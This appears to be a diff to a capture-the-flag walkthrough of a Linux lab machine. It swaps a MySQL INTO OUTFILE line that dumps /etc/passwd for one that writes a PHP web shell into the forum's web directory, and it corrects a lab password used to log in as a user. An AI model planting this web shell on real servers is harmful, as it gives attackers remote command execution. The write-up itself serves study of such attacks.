@@ -71,7 +71,8 @@ source : https://www.netspi.com/blog/technical/network-penetration-testing/linux
 
 After few tries we found the right way to call it :
 
-select '<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>' into outfile '/var/www/forum/templates_c/passwd.php'
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+INTO OUTFILE '/var/www/forum/templates_c/shell.php'
 
 Then after sneaking around calling ls, pwd ...etc we found in the /home directory some subdirectories related to others users :
 
@@ -621,7 +622,7 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426315
 
 We can now log as Thor with :
 
-Publicspeakingisveryeasy.126241207201b2149opekmq426315
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 In Thor's home there is a readme and a turtle.py file :
 
